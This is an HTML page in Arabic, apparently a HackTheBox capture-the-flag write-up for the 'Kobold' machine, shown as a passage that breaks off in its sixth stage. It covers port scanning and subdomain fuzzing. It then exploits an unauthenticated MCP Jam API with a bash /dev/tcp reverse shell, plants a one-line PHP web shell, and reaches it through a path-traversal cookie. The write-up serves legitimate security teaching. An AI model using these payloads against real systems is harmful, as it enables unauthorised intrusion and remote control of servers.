@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kobold HTB - شرح تفصيلي</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      line-height: 1.8;
+      padding: 30px 20px;
+    }
+
+    .container {
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    /* Header */
+    .header {
+      background: linear-gradient(135deg, #1f6feb, #388bfd);
+      border-radius: 12px;
+      padding: 40px;
+      text-align: center;
+      margin-bottom: 40px;
+      box-shadow: 0 4px 20px rgba(31, 111, 235, 0.3);
+    }
+
+    .header h1 {
+      font-size: 2.5rem;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      color: #cce5ff;
+      font-size: 1rem;
+    }
+
+    .badges {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 16px;
+      flex-wrap: wrap;
+    }
+
+    .badge {
+      padding: 5px 16px;
+      border-radius: 20px;
+      font-size: 0.85rem;
+      font-weight: bold;
+    }
+
+    .badge-linux { background: #f0883e; color: #000; }
+    .badge-easy  { background: #3fb950; color: #000; }
+    .badge-cve   { background: #ff6b6b; color: #fff; }
+
+    /* Info Table */
+    .info-table {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      padding: 24px;
+      margin-bottom: 40px;
+    }
+
+    .info-table h2 {
+      color: #58a6ff;
+      margin-bottom: 16px;
+      font-size: 1.2rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    th, td {
+      padding: 12px 16px;
+      border: 1px solid #30363d;
+      text-align: right;
+    }
+
+    th {
+      background: #21262d;
+      color: #58a6ff;
+      font-weight: bold;
+    }
+
+    td { background: #0d1117; }
+
+    /* Stage */
+    .stage {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      margin-bottom: 36px;
+      overflow: hidden;
+    }
+
+    .stage-header {
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid #30363d;
+    }
+
+    .stage-number {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+
+    .stage-title { font-size: 1.25rem; font-weight: bold; color: #e6edf3; }
+    .stage-subtitle { font-size: 0.85rem; color: #8b949e; margin-top: 2px; }
+    .stage-body { padding: 24px; }
+
+    /* Colors per stage */
+    .s1 .stage-number { background: #1f6feb; color: #fff; }
+    .s1 .stage-header { border-right: 4px solid #1f6feb; }
+    .s2 .stage-number { background: #8957e5; color: #fff; }
+    .s2 .stage-header { border-right: 4px solid #8957e5; }
+    .s3 .stage-number { background: #ff6b6b; color: #fff; }
+    .s3 .stage-header { border-right: 4px solid #ff6b6b; }
+    .s4 .stage-number { background: #f0883e; color: #fff; }
+    .s4 .stage-header { border-right: 4px solid #f0883e; }
+    .s5 .stage-number { background: #3fb950; color: #000; }
+    .s5 .stage-header { border-right: 4px solid #3fb950; }
+    .s6 .stage-number { background: #d29922; color: #000; }
+    .s6 .stage-header { border-right: 4px solid #d29922; }
+    .s7 .stage-number { background: #ec6547; color: #fff; }
+    .s7 .stage-header { border-right: 4px solid #ec6547; }
+    .s8 .stage-number { background: #58a6ff; color: #000; }
+    .s8 .stage-header { border-right: 4px solid #58a6ff; }
+    .s9 .stage-number { background: #bc8cff; color: #000; }
+    .s9 .stage-header { border-right: 4px solid #bc8cff; }
+    .s10 .stage-number { background: #ff6b6b; color: #fff; }
+    .s10 .stage-header { border-right: 4px solid #ff6b6b; }
+    .s11 .stage-number { background: #3fb950; color: #000; }
+    .s11 .stage-header { border-right: 4px solid #3fb950; }
+
+    /* Code blocks */
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      margin: 14px 0;
+      overflow: hidden;
+    }
+
+    .code-label {
+      background: #21262d;
+      padding: 6px 16px;
+      font-size: 0.8rem;
+      color: #8b949e;
+      border-bottom: 1px solid #30363d;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .code-label span { color: #58a6ff; font-weight: bold; }
+
+    pre {
+      padding: 16px;
+      font-family: 'Courier New', Consolas, monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      direction: ltr;
+      text-align: left;
+      line-height: 1.6;
+    }
+
+    /* Syntax highlight manual */
+    .cmd  { color: #79c0ff; }
+    .flag { color: #d2a8ff; }
+    .val  { color: #a5d6ff; }
+    .str  { color: #a8d8a8; }
+    .cmt  { color: #6e7681; font-style: italic; }
+    .key  { color: #ff7b72; }
+    .num  { color: #f0883e; }
+    .ok   { color: #3fb950; font-weight: bold; }
+    .err  { color: #ff6b6b; }
+
+    /* Explanation boxes */
+    .explain {
+      background: #1c2128;
+      border-right: 3px solid #388bfd;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin: 14px 0;
+      font-size: 0.95rem;
+    }
+
+    .explain-title {
+      color: #58a6ff;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+
+    /* Alert boxes */
+    .alert {
+      border-radius: 8px;
+      padding: 14px 18px;
+      margin: 14px 0;
+      font-size: 0.9rem;
+    }
+
+    .alert-info    { background: #1c2128; border: 1px solid #388bfd; }
+    .alert-success { background: #1a2b1a; border: 1px solid #3fb950; }
+    .alert-warning { background: #2b2008; border: 1px solid #d29922; }
+    .alert-danger  { background: #2b0a0a; border: 1px solid #ff6b6b; }
+
+    .alert-info    .alert-icon { color: #58a6ff; }
+    .alert-success .alert-icon { color: #3fb950; }
+    .alert-warning .alert-icon { color: #d29922; }
+    .alert-danger  .alert-icon { color: #ff6b6b; }
+
+    .alert-icon { font-weight: bold; margin-left: 8px; }
+
+    /* Result box */
+    .result {
+      background: #0a1628;
+      border: 1px solid #1f6feb;
+      border-radius: 8px;
+      padding: 14px 18px;
+      margin: 14px 0;
+    }
+
+    .result-title {
+      color: #388bfd;
+      font-size: 0.8rem;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+
+    /* Part explanation */
+    .parts {
+      display: grid;
+      gap: 10px;
+      margin: 14px 0;
+    }
+
+    .part {
+      background: #1c2128;
+      border-radius: 6px;
+      padding: 10px 14px;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 12px;
+      align-items: start;
+    }
+
+    .part-code {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 2px 8px;
+      font-family: monospace;
+      font-size: 0.85rem;
+      color: #79c0ff;
+      white-space: nowrap;
+      direction: ltr;
+    }
+
+    .part-desc { color: #c9d1d9; font-size: 0.9rem; }
+
+    /* Flow diagram */
+    .flow {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+      margin: 20px 0;
+    }
+
+    .flow-box {
+      background: #21262d;
+      border: 1px solid #388bfd;
+      border-radius: 8px;
+      padding: 10px 24px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #e6edf3;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    .flow-arrow {
+      color: #388bfd;
+      font-size: 1.5rem;
+      line-height: 1;
+      margin: 4px 0;
+    }
+
+    /* CVE box */
+    .cve-box {
+      background: #2b0a0a;
+      border: 2px solid #ff6b6b;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 14px 0;
+      text-align: center;
+    }
+
+    .cve-number {
+      font-size: 1.8rem;
+      font-weight: bold;
+      color: #ff6b6b;
+      letter-spacing: 2px;
+    }
+
+    .cve-name {
+      color: #ffa0a0;
+      margin-top: 6px;
+      font-size: 0.95rem;
+    }
+
+    /* Divider */
+    .divider {
+      border: none;
+      border-top: 1px solid #30363d;
+      margin: 20px 0;
+    }
+
+    /* Summary chain */
+    .chain {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 40px;
+    }
+
+    .chain h2 {
+      color: #58a6ff;
+      margin-bottom: 20px;
+      font-size: 1.2rem;
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      color: #6e7681;
+      font-size: 0.85rem;
+      padding: 20px;
+      border-top: 1px solid #30363d;
+      margin-top: 40px;
+    }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+      .header h1 { font-size: 1.6rem; }
+      .part { grid-template-columns: 1fr; }
+    }
+    .flag-blur {
+      filter: blur(6px);
+      cursor: pointer;
+      transition: filter 0.3s ease;
+      user-select: none;
+      display: inline-block;
+    }
+    .flag-blur.revealed {
+      filter: none;
+      user-select: text;
+    }
+    .flag-blur::after {
+      content: ' 👁';
+      font-size: 0.7em;
+      opacity: 0.5;
+    }
+    .flag-blur.revealed::after {
+      content: '';
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ===== HEADER ===== -->
+  <div class="header">
+    <p style="font-size: 1rem; font-weight: bold; color: #79c0ff; margin-bottom: 6px;">Writeup by: joudi janble</p>
+    <h1>🔐 Kobold - HackTheBox</h1>
+    <p>شرح تفصيلي بالعربي لكل خطوة من الفحص حتى استخراج الـ Credentials</p>
+    <div class="badges">
+      <span class="badge badge-linux">Linux</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-cve">CVE-2026-23744</span>
+    </div>
+  </div>
+
+  <!-- ===== INFO TABLE ===== -->
+  <div class="info-table">
+    <h2>📋 معلومات عامة</h2>
+    <table>
+      <tr><th>الحقل</th><th>القيمة</th></tr>
+      <tr><td>اسم الجهاز</td><td>Kobold</td></tr>
+      <tr><td>نظام التشغيل</td><td>Linux</td></tr>
+      <tr><td>مستوى الصعوبة</td><td>Easy (سهل)</td></tr>
+      <tr><td>الـ IP</td><td>10.129.245.50</td></tr>
+      <tr><td>الـ CVE</td><td>CVE-2026-23744</td></tr>
+      <tr><td>نوع الثغرة الرئيسية</td><td>Unauthenticated RCE في MCP Jam API</td></tr>
+      <tr><td>المسار</td><td>RCE → Path Traversal → Credentials → Docker Escape → Root</td></tr>
+    </table>
+  </div>
+
+  <!-- ===== STAGE 1 ===== -->
+  <div class="stage s1">
+    <div class="stage-header">
+      <div class="stage-number">1</div>
+      <div>
+        <div class="stage-title">فحص البورتات - Port Scanning</div>
+        <div class="stage-subtitle">اكتشاف الخدمات الشغالة على المشين</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو الهدف من هذه الخطوة؟</div>
+        نريد أن نعرف أي خدمات (Services) شغالة على المشين، لأن كل خدمة قد تكون نقطة دخول.
+        نستخدم أداة <strong>nmap</strong> وهي الأداة الأشهر لفحص الشبكات.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر الأول - فحص سريع لكل البورتات:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">nmap</span> <span class="flag">-p-</span> <span class="flag">--open</span> <span class="flag">-sS</span> <span class="flag">--min-rate</span> <span class="num">5000</span> <span class="flag">-Pn</span> <span class="val">10.129.245.50</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">-p-</div>
+          <div class="part-desc">افحص كل البورتات من 1 حتى 65535 (بدلاً من الـ 1000 الافتراضية فقط)</div>
+        </div>
+        <div class="part">
+          <div class="part-code">--open</div>
+          <div class="part-desc">اعرض فقط البورتات المفتوحة، اخفِ المغلقة لتوفير الوقت</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-sS</div>
+          <div class="part-desc">SYN Scan = فحص سريع وصامت لا يكمل الـ TCP handshake</div>
+        </div>
+        <div class="part">
+          <div class="part-code">--min-rate 5000</div>
+          <div class="part-desc">أرسل على الأقل 5000 packet في الثانية = فحص سريع جداً</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-Pn</div>
+          <div class="part-desc">تجاوز الـ ping (HTB machines لا ترد على ping عادةً)</div>
+        </div>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة</div>
+        <pre><span class="ok">22/tcp   open  ssh</span>
+<span class="ok">80/tcp   open  http</span>
+<span class="ok">443/tcp  open  https</span>
+<span class="ok">3552/tcp open  ???</span>   <span class="cmt"># ← مهم! تحقق منه لاحقاً</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر الثاني - فحص تفصيلي للبورتات المفتوحة فقط:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">nmap</span> <span class="flag">-p</span><span class="num">22,80,443,3552</span> <span class="flag">-sCV</span> <span class="val">10.129.245.50</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">-sC</div>
+          <div class="part-desc">شغّل الـ default scripts للحصول على معلومات إضافية (مثل عنوان الصفحة وغيره)</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-sV</div>
+          <div class="part-desc">اكتشف إصدار كل خدمة (Version Detection)</div>
+        </div>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ معلومات مهمة طلعت</div>
+        <pre><span class="num">3552/tcp</span> <span class="ok">open</span>  http   <span class="str">Go HTTP server</span>
+<span class="cmt"># التطبيق مكتوب بلغة Go</span>
+<span class="cmt"># يحتوي على routes تبدأ بـ /api/</span></pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 2 ===== -->
+  <div class="stage s2">
+    <div class="stage-header">
+      <div class="stage-number">2</div>
+      <div>
+        <div class="stage-title">اكتشاف الـ Subdomains</div>
+        <div class="stage-subtitle">Virtual Host Enumeration - البحث عن مواقع مخفية</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو Virtual Host؟</div>
+        نفس الـ IP يمكن أن يستضيف عدة مواقع مختلفة عبر أسماء مختلفة.
+        مثلاً: <code>mcp.kobold.htb</code> و <code>bin.kobold.htb</code> كلاهما على نفس الـ IP
+        لكنهما مواقع مختلفة تماماً.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الخطوة 1 - إضافة الـ Domain لـ /etc/hosts:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">sudo nano</span> /etc/hosts
+
+<span class="cmt"># أضف هذا السطر:</span>
+<span class="num">10.129.245.50</span>    <span class="str">kobold.htb</span></pre>
+      </div>
+
+      <div class="alert alert-warning">
+        <span class="alert-icon">⚠️</span>
+        هذه الخطوة ضرورية لأن المشين يستخدم اسم domain وليس IP مباشرة.
+        بدونها لن تتمكن من الوصول للموقع.
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 2 - فحص الـ Subdomains بـ ffuf:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">ffuf</span> <span class="flag">-u</span> <span class="str">https://kobold.htb</span> \
+     <span class="flag">-H</span> <span class="str">"Host: FUZZ.kobold.htb"</span> \
+     <span class="flag">-w</span> <span class="val">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> \
+     <span class="flag">-fs</span> <span class="num">154</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">-u https://kobold.htb</div>
+          <div class="part-desc">الـ URL ثابت لا يتغير - نحن لا نغير المسار</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-H "Host: FUZZ.kobold.htb"</div>
+          <div class="part-desc">كلمة FUZZ تتغير من القائمة - هنا يكون التخمين في الـ Host header</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-w /usr/.../subdomains.txt</div>
+          <div class="part-desc">قائمة الكلمات للتخمين - تحتوي على آلاف الأسماء الشائعة</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-fs 154</div>
+          <div class="part-desc">اخفِ الـ responses بحجم 154 bytes (هذا هو الرد الافتراضي للصفحة غير الموجودة)</div>
+        </div>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 لماذا -fs 154 وليس رقم آخر؟</div>
+        أول ما تشغل ffuf بدون -fs ستشوف نفس الحجم يتكرر في كل النتائج.
+        ذاك الرقم المتكرر هو الرد الافتراضي (404 مخفي). تضعه في -fs لإخفائه وتظهر فقط النتائج المختلفة.
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة - Subdomains مكتشفة</div>
+        <pre><span class="ok">mcp</span>   <span class="num">200</span>   → <span class="str">mcp.kobold.htb</span>   <span class="cmt"># MCP Jam - التطبيق الرئيسي</span>
+<span class="ok">bin</span>   <span class="num">200</span>   → <span class="str">bin.kobold.htb</span>   <span class="cmt"># PrivateBin - أداة مشاركة النصوص</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 3 - أضف الـ Subdomains لـ /etc/hosts:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>/etc/hosts</span>text</div>
+        <pre><span class="num">10.129.245.50</span>    <span class="str">kobold.htb  mcp.kobold.htb  bin.kobold.htb</span></pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 3 ===== -->
+  <div class="stage s3">
+    <div class="stage-header">
+      <div class="stage-number">3</div>
+      <div>
+        <div class="stage-title">اكتشاف الثغرة - CVE-2026-23744</div>
+        <div class="stage-subtitle">Unauthenticated RCE في MCP Jam API</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="cve-box">
+        <div class="cve-number">CVE-2026-23744</div>
+        <div class="cve-name">MCP Jam API - Remote Code Execution بدون مصادقة</div>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو MCP Jam؟</div>
+        هو تطبيق ويب يعمل على port 3552، مصمم لتنسيق عمليات الـ MCP (Model Context Protocol).
+        يحتوي على API endpoint اسمه <code>/api/mcp/connect</code> يقبل إعدادات تشغيل برامج من المستخدم
+        <strong>بدون أي تحقق من الهوية</strong>.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - اختبار الـ Endpoint:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-k</span> <span class="str">https://mcp.kobold.htb/api/mcp/connect</span> \
+     <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+     <span class="flag">-d</span> <span class="str">'{"serverId": "test"}'</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">curl</div>
+          <div class="part-desc">أداة لإرسال HTTP requests من الـ terminal</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-k</div>
+          <div class="part-desc">تجاهل أخطاء SSL (الشهادة غير موثوقة في HTB)</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-H "Content-Type: application/json"</div>
+          <div class="part-desc">أخبر السيرفر أن البيانات بصيغة JSON</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-d '{"serverId": "test"}'</div>
+          <div class="part-desc">البيانات المرسلة في الـ Body</div>
+        </div>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ الرد من السيرفر</div>
+        <pre><span class="err">{"success":false,"error":"serverConfig is required"}</span></pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🎯</span>
+        <strong>هذا الرد يعني:</strong> الـ Endpoint شغال وموجود، ويطلب حقل <code>serverConfig</code> في الـ JSON.
+        اسم هذا الحقل يوحي أنه يقبل إعدادات لتشغيل برنامج. هذه هي الثغرة!
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 لماذا هذا خطير؟</div>
+        السيرفر يسمح لأي شخص (بدون login) بإرسال اسم برنامج وسيشغله.
+        هذا مثل إعطاء أي غريب مفاتيح منزلك وقول "افعل ما تشاء".
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 4 ===== -->
+  <div class="stage s4">
+    <div class="stage-header">
+      <div class="stage-number">4</div>
+      <div>
+        <div class="stage-title">الدخول الأولي - Reverse Shell</div>
+        <div class="stage-subtitle">استغلال الثغرة للحصول على shell كـ user ben</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو Reverse Shell؟</div>
+        بدلاً من أن نتصل نحن بالسيرفر (وهو مسدود بـ Firewall)،
+        نجعل السيرفر يتصل بجهازنا. نستقبل الاتصال ونتحكم فيه.
+      </div>
+
+      <div class="flow">
+        <div class="flow-box">جهازنا - Kali</div>
+        <div class="flow-arrow">↑ يستقبل اتصال</div>
+        <div class="flow-box" style="border-color:#3fb950;">السيرفر - Kobold يتصل بنا</div>
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الخطوة 1 - جهّز الـ Listener (Terminal 1):</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal 1 - Kali</span>bash</div>
+        <pre><span class="cmd">nc</span> <span class="flag">-nlvp</span> <span class="num">4444</span>
+
+<span class="cmt"># nc    = netcat أداة للاستماع على بورت
+# -n    = no DNS resolution (أسرع)
+# -l    = listen mode (استماع)
+# -v    = verbose (اعرض التفاصيل)
+# -p    = port number</span></pre>
+      </div>
+
+      <div class="alert alert-info">
+        <span class="alert-icon">ℹ️</span>
+        اتركه شغالاً وافتح Terminal ثاني. هذا سيستقبل الـ shell من السيرفر.
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 2 - شوف IP بتاعك على VPN:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal 2 - Kali</span>bash</div>
+        <pre><span class="cmd">ip addr show</span> tun0 | <span class="cmd">grep</span> inet
+<span class="cmt"># الـ IP اللي يبدأ بـ 10.10.14.x هو IP بتاعك على HTB</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 3 - شغّل الـ Exploit (Terminal 2):</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal 2 - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-k</span> <span class="str">https://mcp.kobold.htb/api/mcp/connect</span> \
+  <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="str">'{
+    "serverConfig": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"],
+      "env": {}
+    },
+    "serverId": "test"
+  }'</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>شرح الـ JSON المرسل:</strong></p>
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">"command": "bash"</div>
+          <div class="part-desc">البرنامج الذي سيشغله السيرفر = bash</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"-c"</div>
+          <div class="part-desc">arg أول = يعني "شغّل هذا الأمر كـ string"</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"bash -i >& /dev/tcp/IP/4444 0>&1"</div>
+          <div class="part-desc">arg ثاني = الأمر الخطير: افتح bash تفاعلي واتصل بـ IP على port 4444</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"env": {}</div>
+          <div class="part-desc">متغيرات البيئة - فارغة، لا نحتاجها</div>
+        </div>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>شرح أمر الـ Reverse Shell:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>شرح مفصل</span>text</div>
+        <pre>bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+
+bash          → افتح bash
+-i            → interactive (تفاعلي)
+>&            → حوّل الـ output
+/dev/tcp/IP/4444 → اتصل بـ IP على port 4444 عبر TCP
+0>&1          → الـ input أيضاً يجي من نفس الاتصال</pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة في Terminal 1</div>
+        <pre><span class="ok">connect to [10.10.14.x] from (UNKNOWN) [10.129.245.50] XXXXX</span>
+ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ <span class="ok">_</span>
+<span class="cmt"># حصلنا على shell كـ ben ✅</span></pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 5 ===== -->
+  <div class="stage s5">
+    <div class="stage-header">
+      <div class="stage-number">5</div>
+      <div>
+        <div class="stage-title">Enumeration داخلي - جمع المعلومات</div>
+        <div class="stage-subtitle">ماذا يملك user ben؟ ما هي المجموعات؟</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 لماذا نجمع المعلومات بعد الدخول؟</div>
+        بعد الدخول كـ ben، نحتاج نعرف:
+        ما هي صلاحياته؟ ما هي مجموعاته؟ ماذا يمكنه الوصول إليه؟
+        هذا يساعدنا نجد طريق لرفع الصلاحيات.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - فحص المجموعات:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - ben@kobold</span>bash</div>
+        <pre><span class="cmd">id</span></pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة</div>
+        <pre>uid=<span class="num">1001</span>(<span class="ok">ben</span>) gid=<span class="num">1001</span>(ben) groups=<span class="num">1001</span>(ben),<span class="num">37</span>(<span class="key">operator</span>)
+<span class="cmt"># ben عضو في مجموعة "operator" ← مهم جداً!</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر - البحث عن ملفات تملكها مجموعة operator:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - ben@kobold</span>bash</div>
+        <pre><span class="cmd">find</span> / <span class="flag">-group</span> operator <span class="num">2</span>>/dev/null</pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">find /</div>
+          <div class="part-desc">ابحث من الـ root directory في كل النظام</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-group operator</div>
+          <div class="part-desc">اعرض فقط الملفات التي مجموعتها operator</div>
+        </div>
+        <div class="part">
+          <div class="part-code">2>/dev/null</div>
+          <div class="part-desc">أخفِ رسائل الخطأ (Permission denied) لتنظيف المخرجات</div>
+        </div>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة المهمة</div>
+        <pre>/privatebin-data
+/privatebin-data/certs
+/privatebin-data/data        <span class="ok">← نقدر نكتب هنا!</span>
+/privatebin-data/data/purge_limiter.php
+/privatebin-data/data/pwn.php
+/privatebin-data/data/salt.php
+/privatebin-data/data/traffic_limiter.php</pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🎯</span>
+        <strong>الاكتشاف المهم:</strong> نقدر نكتب ملفات في <code>/privatebin-data/data/</code>
+        وهذا الـ directory هو اللي يقرأ منه PrivateBin على <code>bin.kobold.htb</code>!
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 6 ===== -->
+  <div class="stage s6">
+    <div class="stage-header">
+      <div class="stage-number">6</div>
+      <div>
+        <div class="stage-title">استغلال PrivateBin - Path Traversal + PHP RCE</div>
+        <div class="stage-subtitle">كتابة PHP خبيث واستغلال ثغرة Path Traversal</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو Path Traversal؟</div>
+        PrivateBin يقبل cookie اسمها <code>template</code> لتحديد قالب التصميم.
+        المفترض يقرأ من: <code>/privatebin-data/templates/XXXX</code>
+        لكن إذا وضعنا <code>../data/pwn</code> يصبح:
+        <code>/privatebin-data/templates/../data/pwn.php</code>
+        وهذا يعني: <code>/privatebin-data/data/pwn.php</code> ← ملفنا الخبيث!
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الخطوة 1 - اكتب ملف PHP خبيث (من shell بتاع ben):</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - ben@kobold</span>bash</div>
+        <pre><span class="cmd">cat</span> > /privatebin-data/data/pwn.php << <span class="str">'EOF'</span>
+<span class="key">&lt;?php</span> <span class="cmd">system</span>(<span class="val">$_GET</span>[<span class="str">'cmd'</span>]); <span class="key">?&gt;</span>
+<span class="str">EOF</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">cat > /path/file.php</div>
+          <div class="part-desc">اكتب محتوى إلى ملف جديد</div>
+        </div>
+        <div class="part">
+          <div class="part-code">&lt;&lt; 'EOF'</div>
+          <div class="part-desc">Heredoc: اكتب حتى تجد كلمة EOF في سطر وحده</div>
+        </div>
+        <div class="part">
+          <div class="part-code"><?php system($_GET['cmd']); ?></div>
+          <div class="part-desc">كود PHP: نفّذ أي أمر يأتي في parameter اسمه cmd</div>
+        </div>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 2 - اختبار التنفيذ (من جهاز Kali):</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-k</span> <span class="str">https://bin.kobold.htb/</span> \
+  <span class="flag">-b</span> <span class="str">"template=../data/pwn"</span> \
+  <span class="flag">-G</span> <span class="flag">--data-urlencode</span> <span class="str">"cmd=id"</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">-b "template=../data/pwn"</div>
+          <div class="part-desc">أرسل cookie اسمها template بقيمة ../data/pwn ← Path Traversal</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-G</div>
+          <div class="part-desc">أرسل الـ data كـ GET parameters في الـ URL</div>
+        </div>
+        <div class="part">
+          <div class="part-code">--data-urlencode "cmd=id"</div>
+          <div class="part-desc">أرسل parameter اسمه cmd بقيمة id (مع URL encoding تلقائي)</div>
+        </div>
